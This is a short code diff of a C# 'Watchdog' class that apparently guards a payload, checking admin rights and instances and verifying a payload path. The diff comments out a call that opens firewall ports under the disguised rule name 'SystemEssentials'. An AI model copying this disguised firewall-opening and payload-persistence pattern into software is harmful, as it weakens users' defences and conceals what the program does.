@@ -12,6 +12,7 @@ class Watchdog
         {
             if (!isNewInstance && isAdmin)
             {
+
                 watchdogHelper.Log("Another instance of the watchdog is already running.");
 
                 int? PID = watchdogHelper.GetProcessIdByName(Process.GetCurrentProcess().ProcessName);
@@ -75,7 +76,7 @@ class Watchdog
             foreach(int port in Config.PortsToKeepOpen)
             { 
                 string ruleName = "SystemEssentials" + port.ToString();
-                watchdogHelper.OpenFirewallPort(port, ruleName);
+                //watchdogHelper.OpenFirewallPort(port, ruleName);
             }
 
             watchdogHelper.verifyFilePathsSourceAndDest(Config.PayloadPath, Config.PayloadName);
